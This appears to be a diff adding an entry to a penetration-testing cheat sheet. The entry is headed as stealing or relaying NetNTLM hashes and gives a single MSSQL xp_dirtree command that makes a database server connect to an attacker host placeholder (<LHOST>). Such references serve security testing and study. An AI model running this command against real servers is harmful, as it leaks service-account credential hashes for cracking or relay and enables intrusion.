@@ -1847,6 +1847,12 @@ mongo "mongodb://localhost:27017"
 2> go > export.txt
 ```
 
+##### Steal NetNTLM Hash / Relay Attack
+
+```c
+SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
+```
+
 #### MySQL
 
 ```c
